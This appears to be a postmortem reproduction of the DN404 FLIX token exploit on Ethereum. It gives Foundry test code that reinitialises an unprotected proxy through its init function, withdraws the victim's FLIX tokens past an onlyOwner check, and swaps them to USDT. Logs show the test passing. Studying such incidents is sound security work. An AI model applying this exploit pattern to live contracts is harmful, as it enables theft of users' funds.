# FLIX Token Attack Incident

## Information
+ Protocol Name: DN404 FLIX
+ Total Loss: 200 K
+ Network: Ethereum Mainnet
  
+ Attacker: 0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd
+ Attack Contract: 0xd129d8c12f0e7aa51157d9e6cc3f7ece2dc84ecd
+ Victim Contract: 0x2c7112245fc4af701ebf90399264a7e89205dad4
+ Transaction: 0xbeef09ee9d694d2b24f3f367568cc6ba1dad591ea9f969c36e5b181fd301be82

## Reproduction
1. Add funding token and configure block number:

```solidity
uint256 constant forkBlock = 19_196_685;
address constant fundToken = address(0xdAC17F958D2ee523a2206206994597C13D831ec7);
```

2. Add constant variable:

```solidity
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant FLIX = 0x83Cb9449b7077947a13Bf32025A8eAA3Fb1D8A5e;
address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
address constant Victim = 0x2c7112245Fc4af701EBf90399264a7e89205Dad4;
address constant Pair = 0xa7434b755852F2555D6F96B9E28bAfE92F08Df97;
```

3. Add label in `setup` function
```solidity
vm.label(Victim, "Proxy");
vm.label(WETH, "WETH");
vm.label(FLIX, "FLIX");
vm.label(USDT, "USDT");
vm.label(Pair, "Uniswap V3 Pair");
```

4. Add necessary interface for victim contract
```solidity
interface IProxy {
    function init(IERC20 initToken, uint256 initPeriods, uint256 initInterval) external;
    function withdraw(IERC20 otherToken, uint256 amount, address receiver) external;
}
```

5. Execute exploit process:
```solidity
// Step 1: Call unprotected `init` function
uint256 initPeriods = 1;
uint256 initInterval = 1_000_000_000_000_000_000;
uint256 amount = IERC20(FLIX).balanceOf(Victim);
IProxy(Victim).init(IERC20(WETH), initPeriods, initInterval);

// Step 2: Bypass `onlyOwner` modifier and call `withdraw`
IProxy(Victim).withdraw(IERC20(FLIX), amount, address(this));
```

6. Execute post attack handling:
```solidity
// Swap FLIX token to USDT
address recipient = address(this);
bool zeroForOne = true;
int256 amountSpecified = int256(IERC20(FLIX).balanceOf(address(this)));
uint160 sqrtPriceLimitX96 = 4_295_128_740;
IUniswapV3Pair(Pair).swap(recipient, zeroForOne, amountSpecified, sqrtPriceLimitX96, "");
```

7. Run forge command and check the final result:

Command
```bash
forge test --mc FLIXTest -vvv
```

Result
```bash
Ran 1 test for test/FLIX/PoC.t.sol:FLIXTest
[PASS] testExploit() (gas: 159575)
Logs:
  Attacker Token Balance Before Exploit:  0
  Attacker Token Balance After Exploit:  169577736489

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 530.42ms (2.15ms CPU time)
```